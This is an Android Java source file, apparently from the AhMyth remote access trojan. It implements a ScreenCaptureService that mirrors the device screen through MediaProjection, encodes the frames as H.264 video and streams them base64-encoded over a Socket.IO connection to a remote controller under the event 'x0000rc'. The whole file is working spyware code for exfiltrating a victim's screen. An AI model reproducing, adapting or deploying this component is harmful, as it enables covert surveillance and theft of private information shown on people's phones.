package ahmyth.mine.king.ahmyth;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;
import android.view.Surface;

import androidx.annotation.RequiresApi;

import org.json.JSONObject;

import java.nio.ByteBuffer;

import io.socket.client.Socket;

public class ScreenCaptureService extends Service {
    
    private static final String TAG = "ScreenCapture";
    private static final String CHANNEL_ID = "screen_capture_channel";
    
    // Screen capture settings
    private static final int SCREEN_WIDTH = 480;
    private static final int SCREEN_HEIGHT = 480;
    private static final int SCREEN_DPI = 160;
    private static final int FRAME_RATE = 15;
    private static final int BIT_RATE = 500000; // 500kbps
    
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private MediaCodec encoder;
    private Surface inputSurface;
    private boolean isStreaming = false;
    
    private Intent resultData;
    private int resultCode;
    
    private Socket ioSocket;
    private Handler encoderHandler;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannel();
        }
        
        encoderHandler = new Handler();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            Log.e(TAG, "Screen capture requires Android 5.0 (API 21) or higher");
            stopSelf();
            return START_NOT_STICKY;
        }
        
        if (intent != null) {
            String action = intent.getAction();
            
            if ("START_CAPTURE".equals(action)) {
                resultCode = intent.getIntExtra("resultCode", 0);
                resultData = intent.getParcelableExtra("resultData");
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    startForeground(1, createNotification());
                    startScreenCapture();
                }
            } else if ("STOP_CAPTURE".equals(action)) {
                stopScreenCapture();
                stopSelf();
            }
        }
        
        return START_STICKY;
    }
    
    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private void startScreenCapture() {
        try {
            ioSocket = IOSocket.getInstance().getIoSocket();
            
            if (ioSocket == null || !ioSocket.connected()) {
                Log.e(TAG, "Socket not connected");
                stopSelf();
                return;
            }
            
            // Initialize MediaProjection
            MediaProjectionManager projectionManager = 
                (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            
            mediaProjection = projectionManager.getMediaProjection(resultCode, resultData);
            
            if (mediaProjection == null) {
                Log.e(TAG, "Failed to create MediaProjection");
                stopSelf();
                return;
            }
            
            // Setup MediaCodec encoder
            setupEncoder();
            
            // Create VirtualDisplay
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "AhMyth-ScreenCapture",
                SCREEN_WIDTH,
                SCREEN_HEIGHT,
                SCREEN_DPI,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                inputSurface,
                null,
                null
            );
            
            isStreaming = true;
            
            // Start encoding thread
            new Thread(new Runnable() {
                @Override
                public void run() {
                    encodeAndSendFrames();
                }
            }).start();
            
            Log.i(TAG, "Screen capture started");
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting screen capture", e);
            stopScreenCapture();
        }
    }
    
    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private void setupEncoder() throws Exception {
        MediaFormat format = MediaFormat.createVideoFormat(
            MediaFormat.MIMETYPE_VIDEO_AVC,
            SCREEN_WIDTH,
            SCREEN_HEIGHT
        );
        
        format.setInteger(MediaFormat.KEY_COLOR_FORMAT,
            MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
        format.setInteger(MediaFormat.KEY_BIT_RATE, BIT_RATE);
        format.setInteger(MediaFormat.KEY_FRAME_RATE, FRAME_RATE);
        format.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 2);
        
        encoder = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC);
        encoder.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
        inputSurface = encoder.createInputSurface();
        encoder.start();
    }
    
    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private void encodeAndSendFrames() {
        MediaCodec.BufferInfo bufferInfo = new MediaCodec.BufferInfo();
        
        while (isStreaming) {
            try {
                int outputBufferIndex = encoder.dequeueOutputBuffer(bufferInfo, 10000);
                
                if (outputBufferIndex >= 0) {
                    ByteBuffer outputBuffer = encoder.getOutputBuffer(outputBufferIndex);
                    
                    if (outputBuffer != null && bufferInfo.size > 0) {
                        byte[] frameData = new byte[bufferInfo.size];
                        outputBuffer.position(bufferInfo.offset);
                        outputBuffer.limit(bufferInfo.offset + bufferInfo.size);
                        outputBuffer.get(frameData);
                        
                        // Send frame via socket
                        sendVideoFrame(frameData);
                    }
                    
                    encoder.releaseOutputBuffer(outputBufferIndex, false);
                    
                } else if (outputBufferIndex == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
                    Log.d(TAG, "Encoder output format changed");
                } else if (outputBufferIndex == MediaCodec.INFO_TRY_AGAIN_LATER) {
                    // No output available yet
                    Thread.sleep(10);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error encoding frame", e);
                break;
            }
        }
    }
    
    private void sendVideoFrame(byte[] frameData) {
        try {
            if (ioSocket != null && ioSocket.connected()) {
                JSONObject data = new JSONObject();
                data.put("type", 0x20); // Video frame type
                data.put("data", Base64.encodeToString(frameData, Base64.NO_WRAP));
                data.put("timestamp", System.currentTimeMillis());
                
                ioSocket.emit("x0000rc", data);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending video frame", e);
        }
    }
    
    private void stopScreenCapture() {
        isStreaming = false;
        
        try {
            if (virtualDisplay != null) {
                virtualDisplay.release();
                virtualDisplay = null;
            }
            
            if (encoder != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    encoder.stop();
                    encoder.release();
                }
                encoder = null;
            }
            
            if (inputSurface != null) {
                inputSurface.release();
                inputSurface = null;
            }
            
            if (mediaProjection != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    mediaProjection.stop();
                }
                mediaProjection = null;
            }
            
            Log.i(TAG, "Screen capture stopped");
            
        } catch (Exception e) {
            Log.e(TAG, "Error stopping screen capture", e);
        }
    }
    
    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Screen Capture Active")
                .setContentText("Capturing screen...")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .build();
        } else {
            return new Notification.Builder(this)
                .setContentTitle("Screen Capture Active")
                .setContentText("Capturing screen...")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .build();
        }
    }
    
    @RequiresApi(api = Build.VERSION_CODES.O)
    private void createNotificationChannel() {
        NotificationChannel channel = new NotificationChannel(
            CHANNEL_ID,
            "Screen Capture Service",
            NotificationManager.IMPORTANCE_LOW
        );
        channel.setDescription("Service for screen capture");
        
        NotificationManager manager = getSystemService(NotificationManager.class);
        if (manager != null) {
            manager.createNotificationChannel(channel);
        }
    }
    
    @Override
    public void onDestroy() {
        stopScreenCapture();
        super.onDestroy();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}

